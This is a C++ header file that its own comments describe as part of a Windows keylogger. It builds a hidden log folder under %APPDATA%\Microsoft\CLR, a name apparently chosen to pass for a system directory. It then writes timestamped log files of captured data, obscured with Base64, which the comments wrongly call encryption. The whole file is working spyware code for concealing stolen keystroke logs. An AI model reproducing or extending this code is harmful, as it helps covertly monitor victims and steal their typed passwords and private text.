#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>//Use environment functions
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    //Create a folder where we gonna keep all the logs
    std::string GetOurPath(const bool append_separator = false)
    {//Hide keylogger data in appdata/roaming on windows
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\" : "");//If append separator is true show two slashes, if not show nothing
    }

    //Function for actually creating directory in which we will store logs
    bool MkOneDr(std::string path)
    {
    // If directory is not created(path couldnt be found), this function will create it,
    // otherwise it will return false
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS; //Create directory unless it's already created
    }
    //Back Up function in case function above fails cause it can't find path
    bool MKDir(std::string path)
    {//Var C will be looping through each char chars in the path and examine them. One char at a time
        for(char &c : path) {
            if(c == '\\'){
                c='\0';//Reset variable C
                if(!MkOneDr(path))//Check if MkOneDr function fails
                    return false;
                c = '\\';//Continue to next folder until we reach folder that we dont have yet and create it
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);//Get path to folder
        Helper::DateTime dt;//Give files date and time so we know when they were created
        std::string name = dt.GetDateTimeString("_") + ".log";//use underlines as colons in file names
        //Use try catch in case there is a problem
        try
        {
            std::ofstream file(path + name);//Attempt to create a file
            if(!file) return "";//If this file cannot be opened or created, return empty string
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t << std::endl;//Generate time when file was created
            std::string data = Base64::EncryptB64(s.str());//Encrypt our data
            file << data;//Put data into file
            if(!file)//in case of error
                return "";
            file.close();//close the file
            return name;//Name of the file
        }
        catch(...)
        {//In case something goes wrong, dont let program crash just return empty string
            return "";
        }
    }
}

#endif // IO_H
